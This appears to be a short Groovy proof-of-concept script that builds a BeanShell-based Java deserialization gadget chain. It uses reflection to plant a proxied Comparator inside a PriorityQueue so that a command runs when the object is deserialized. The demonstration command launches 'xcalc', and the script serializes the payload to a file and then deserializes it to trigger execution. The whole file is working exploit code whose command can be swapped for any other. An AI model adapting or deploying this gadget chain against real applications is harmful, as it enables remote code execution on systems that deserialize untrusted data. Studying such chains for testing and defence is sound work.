import groovy.lang.GroovyClassLoader
import java.io.*
import bsh.*
import java.lang.reflect.Proxy
import java.lang.reflect.Field
import java.lang.reflect.InvocationHandler
import java.util.Comparator
import java.util.PriorityQueue

// Create gadget chain
String payload = "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{\"xcalc\"}).start();return new Integer(1);}";
Interpreter i = new Interpreter();
i.eval(payload);
XThis xt = new XThis(i.getNameSpace(), i);

Field field = xt.getClass().getDeclaredField("invocationHandler");
field.setAccessible(true);
InvocationHandler ih = (InvocationHandler) field.get(xt);
Class[] classes = [Comparator.class] as Class[];
Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), classes, ih);

final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
Object[] queue = [1,1];
Field field1 = priorityQueue.getClass().getDeclaredField("queue")
field1.setAccessible(true)
field1.set(priorityQueue, queue)
Field field2 = priorityQueue.getClass().getDeclaredField("size")
field2.setAccessible(true)
field2.set(priorityQueue, 2)

File exploit = new File('eploit.ser')

// Serialization
if (exploit.exists()) { exploit.delete() }
assert ! exploit.exists()
def os
try {
    os = exploit.newObjectOutputStream()
    os << priorityQueue
} catch (e) { 
    throw new Exception(e)
} finally { 
    os?.close()
}
assert exploit.exists()

// Deserialization
def is
try {
    is = exploit.newObjectInputStream(this.class.classLoader)
    is.eachObject { println it }
} catch (e) { 
    throw new Exception(e)
} finally { 
    is?.close()
}
exploit.delete()
assert ! exploit.exists()
